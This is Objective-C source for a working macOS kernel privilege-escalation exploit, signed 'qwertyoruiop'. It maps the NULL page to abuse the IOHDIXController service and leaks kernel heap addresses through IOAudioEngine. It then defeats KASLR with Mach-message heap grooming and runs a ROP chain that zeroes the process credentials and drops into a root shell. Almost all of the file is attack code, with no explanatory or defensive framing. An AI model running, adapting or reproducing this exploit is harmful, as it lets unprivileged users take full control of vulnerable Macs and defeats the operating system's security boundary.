#include <Foundation/Foundation.h>
static uint64_t kslide=0;
#define ALLOCS 0x100
#import "import.h"
#import "lsym_gadgets.h"
static mach_port_t servicea = 0;
static mach_port_t servicex = 0;
__attribute__((always_inline)) inline
lsym_slidden_kern_pointer_t lsym_slide_pointer(lsym_kern_pointer_t pointer) {
    if (!pointer) return pointer;
    return (lsym_slidden_kern_pointer_t) pointer + kslide;
}

__attribute__((always_inline)) static inline
uint64_t alloc(uint32_t addr, uint32_t sz) {
    vm_deallocate(mach_task_self(), (vm_address_t) addr, sz);
    vm_allocate(mach_task_self(), (vm_address_t*)&addr, sz, 0);
    while(sz--) *(char*)(addr+sz)=0;
    return addr;
}
__attribute__((always_inline)) static inline
uint64_t leak_heap_ptr(io_connect_t* co) {
    io_connect_t conn = MACH_PORT_NULL;
    if(IOServiceOpen(servicea, mach_task_self(), 0, co) != KERN_SUCCESS) {
        puts("failed");
        exit(-20);
    }
    uint64_t    scalarO_64=0;
    uint32_t    outputCount = 1;
    IOConnectCallScalarMethod(*co, 2, NULL, 0, &scalarO_64, &outputCount);
    if (!scalarO_64) {
        puts("failed infoleaking");
        exit(-20);
    }
    scalarO_64 <<= 8;
    scalarO_64 |=  0xffffff0000000000;
    return  scalarO_64;
}
typedef struct {
    mach_msg_header_t header;
    mach_msg_body_t body;
    mach_msg_ool_descriptor_t desc;
    mach_msg_trailer_t trailer;
} oolmsg_t;
static uint16_t off_w = 0;
__attribute__((always_inline)) static inline
void or_everywhere(uint64_t add) {
    io_connect_t conn = MACH_PORT_NULL;
    IOServiceClose(0); // dyld fails when aslr = 0 & NULL page is mapped, so force this symbol into the plt
    IOServiceOpen(0,0,0,0);  // dyld fails when aslr = 0 & NULL page is mapped, so force this symbol into the plt
    alloc(0, 0x1000);
    volatile uint64_t* mp = (uint64_t*) 0;
    if(!off_w) {
        while ((uint32_t)mp < 0xC00) {
            *mp=(uint64_t)0xC00;
            mp++;
        }
        IOServiceOpen(servicex, kIOMasterPortDefault, 0, &conn);
        IOServiceClose(conn);
        char* kp=(char*)0xC00;
        while ((uint32_t)kp < 0x1000) {
            if (*kp == 0x10) {
                break;
            }
            kp++;
        }
        if ((uint32_t)kp == 0x1000) {
            vm_deallocate(mach_task_self(), 0, 0x1000);
            puts("not vulnerable");
            exit(-1);
        }
        mp=0;
        while ((uint32_t)mp < 0xC00) {
            *mp=(uint64_t)0xC00 - (uint32_t)(kp-0xC00);
            mp++;
        }
        IOServiceOpen(servicex, kIOMasterPortDefault, 0, &conn);
        IOServiceClose(conn);
        if (*((char*)0xC00)!=0x10) {
            vm_deallocate(mach_task_self(), 0, 0x1000);
            puts("wrong offset");
            exit(-2);
        }
        off_w = (uint16_t) kp - 0xc00;
    }
    mp=0;
    while ((uint32_t)mp < 0xC00) {
        *mp=(uint64_t)(add - off_w);
        mp++;
    }
    IOServiceOpen(servicex, kIOMasterPortDefault, 0, &conn);
    vm_deallocate(mach_task_self(), 0, 0x1000);
    IOServiceClose(conn);
}
__attribute__((always_inline)) static inline
void send_kern_data(char* vz, size_t svz, mach_port_t* msgp) {
    oolmsg_t *msg=calloc(sizeof(oolmsg_t)+0x2000,1);
    if(!*msgp){
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, msgp);
        mach_port_insert_right(mach_task_self(), *msgp, *msgp, MACH_MSG_TYPE_MAKE_SEND);
    }
    bzero(msg,sizeof(oolmsg_t));
    msg->header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->header.msgh_bits |= MACH_MSGH_BITS_COMPLEX;
    msg->header.msgh_remote_port = *msgp;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_size = sizeof(oolmsg_t);
    msg->header.msgh_id = 1;
    msg->body.msgh_descriptor_count = 1;
    msg->desc.address = (void *)vz;
    msg->desc.size = svz;
    msg->desc.type = MACH_MSG_OOL_DESCRIPTOR;
    mach_msg( (mach_msg_header_t *) msg, MACH_SEND_MSG, sizeof(oolmsg_t), 0, 0, 0, 0 );
    free(msg);
}
__attribute__((always_inline)) static inline
char* read_kern_data(mach_port_t port) {
    oolmsg_t *msg=calloc(sizeof(oolmsg_t)+0x2000,1);
    bzero(msg,sizeof(oolmsg_t)+0x2000);
    mach_msg((mach_msg_header_t *)msg, MACH_RCV_MSG, 0, sizeof(oolmsg_t)+0x2000, (port), 0, MACH_PORT_NULL);
    return msg->desc.address;
}
int main(int argc, char** argv, char** envp){
    if (getuid() == 0) {
        execve("/bin/sh",((char* []){"/bin/sh",0}), envp);
        exit(0);
    }
    if((int)main < 0x5000) execve(argv[0],argv,envp);
    lsym_map_t* mapping_kernel=lsym_map_file("/mach_kernel");
    if (!mapping_kernel || !mapping_kernel->map) {
        mapping_kernel=lsym_map_file("/System/Library/Kernels/kernel");
    }
    lsym_map_t* mapping_audio=lsym_map_file("/System/Library/Extensions/IOAudioFamily.kext/Contents/MacOS/IOAudioFamily");
    kslide = kext_pointer("com.apple.iokit.IOAudioFamily") + RESOLVE_SYMBOL(mapping_audio, "__ZTV23IOAudioEngineUserClient") + 0x10;
    sync();
    kern_return_t err;
    io_iterator_t iterator;
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHDIXController"), &iterator);
    servicex = IOIteratorNext(iterator);
    IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOAudioEngine"), &iterator);
    servicea = IOIteratorNext(iterator);
    uint64_t c = 0;
    or_everywhere((uint64_t)&c);
    if (c != 0x10) {
        puts("not vulnerable");
        return 2;
    }
    int ctr=0;
#define DO_TIMES(x) for(ctr=0;ctr<x;ctr++)
    struct KernelHeapInfo {
        io_connect_t connect;
        uint64_t kobject;
        mach_port_t port;
    } *heap_info = calloc(sizeof(struct KernelHeapInfo),ALLOCS);
    char* vz = calloc(1500,1);
    
again:;
    int maxt = 10;
    while (maxt--) {
        if (heap_info[maxt+2].connect) {
            IOServiceClose(heap_info[maxt+2].connect);
            heap_info[maxt+2].connect=0;
        }
    }
    maxt = 10;
    while (((heap_info[0].kobject = leak_heap_ptr(&(heap_info[0].connect))) & 0xFFF) == 0xC00) { heap_info[0].connect=0; };
    while ((heap_info[1].kobject = leak_heap_ptr(&(heap_info[1].connect))) ) {
        if (heap_info[1].kobject == 1024+heap_info[0].kobject) {
            break;
        }
        if (maxt == 0) {
            goto again;
        }
        maxt--;
        heap_info[maxt+2].connect=heap_info[1].connect;
        heap_info[1].connect=0;
    };
    
    if (!heap_info[1].connect || !heap_info[0].connect) {
        exit(-3);
    }
    
    IOServiceClose(heap_info[0].connect); // poke hole
    
    DO_TIMES(ALLOCS) {
        send_kern_data(vz, 1024 - 0x58, &(heap_info[ctr].port));
    }
    
    or_everywhere(heap_info[0].kobject + 16);
    or_everywhere(heap_info[0].kobject + 500);
    
    char found = 0;
    DO_TIMES(ALLOCS) {
        char* data = read_kern_data(heap_info[ctr].port);
        if (!found && memcmp(data,vz,1024 - 0x58)) {
            kslide = (*(uint64_t*)((1024-0x58+(char*)data))) - kslide ;
            found=1;
        }
    }
    if (!found) {
        exit(-3);
    }
    
    printf("leaked kaslr slide, @ 0x%016llx\n", kslide);
    
    kernel_fake_stack_t* stack = calloc(1,sizeof(kernel_fake_stack_t));
    
    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, heap_info[1].kobject+0x208);
    PUSH_GADGET(stack) = ROP_ARG2(stack, mapping_kernel, sizeof(uint64_t));
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_bzero");
    
    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, heap_info[1].kobject+0x220);
    PUSH_GADGET(stack) = ROP_ARG2(stack, mapping_kernel, 1)
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_bzero");
    
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_current_proc");
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, mapping_kernel);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_proc_ucred");
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, mapping_kernel);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_posix_cred_get");
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack, mapping_kernel);
    PUSH_GADGET(stack) = ROP_ARG2(stack, mapping_kernel, sizeof(int)*3)
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_bzero");
    
    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uid_t)getuid())
    PUSH_GADGET(stack) = ROP_ARG2(stack, mapping_kernel, (int)-1);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_chgproccnt");
    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uid_t)0);
    PUSH_GADGET(stack) = ROP_ARG2(stack, mapping_kernel, (int)1);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_chgproccnt");
    
    PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);
    PUSH_GADGET(stack) = heap_info[1].kobject+0x210;
    PUSH_GADGET(stack) = ROP_READ_RAX_TO_RAX_POP_RBP(mapping_kernel);
    PUSH_GADGET(stack) = JUNK_VALUE;
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack,mapping_kernel);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_IORecursiveLockUnlock");
    PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);
    PUSH_GADGET(stack) = heap_info[1].kobject+0xe0;
    PUSH_GADGET(stack) = ROP_READ_RAX_TO_RAX_POP_RBP(mapping_kernel);
    PUSH_GADGET(stack) = JUNK_VALUE;
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack,mapping_kernel);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "__ZN10IOWorkLoop8openGateEv");
    PUSH_GADGET(stack) = ROP_POP_RAX(mapping_kernel);
    PUSH_GADGET(stack) = heap_info[1].kobject+0xe8;
    PUSH_GADGET(stack) = ROP_READ_RAX_TO_RAX_POP_RBP(mapping_kernel);
    PUSH_GADGET(stack) = JUNK_VALUE;
    PUSH_GADGET(stack) = ROP_RAX_TO_ARG1(stack,mapping_kernel);
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "__ZN13IOEventSource8openGateEv");
    
    PUSH_GADGET(stack) = ROP_ARG1(stack, mapping_kernel, (uint64_t)"Escalating privileges! -qwertyoruiop\n")
    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_IOLog");

    PUSH_GADGET(stack) = RESOLVE_SYMBOL(mapping_kernel, "_thread_exception_return");
    
    uint64_t* vtable=malloc(0x1000);
    
    vtable[0] = 0;
    vtable[1] = 0;
    vtable[2] = 0;
    vtable[3] = ROP_POP_RAX(mapping_kernel);
    vtable[4] = ROP_PIVOT_RAX(mapping_kernel);
    vtable[5] = ROP_POP_RAX(mapping_kernel);
    vtable[6] = 0;
    vtable[7] = ROP_POP_RSP(mapping_kernel);
    vtable[8] = (uint64_t)stack->__rop_chain;

    or_everywhere(heap_info[1].kobject+0x220); // set online
    or_everywhere(heap_info[1].kobject+0x208); // set userbuffer to 0x000000000010 (!= NULL)
    alloc(0, 0x1000);
    volatile uint64_t* mp = (uint64_t*) 0x10;
    mp[0] = (uint64_t)0;
    mp[1] = (uint64_t)vtable;
    mp[2] = (uint64_t)&mp[1];
    uint64_t xn = IOConnectRelease((io_connect_t  )heap_info[1].connect); // running code!
    vm_deallocate(mach_task_self(), 0, 0x1000);
    setuid(0);
    if (getuid() == 0) {
        system("/bin/sh");
        exit(0);
    }
    
    puts("didn't get root, but this system is vulnerable. ");
    puts("kernel heap may be corrupted");
    return 1;
}
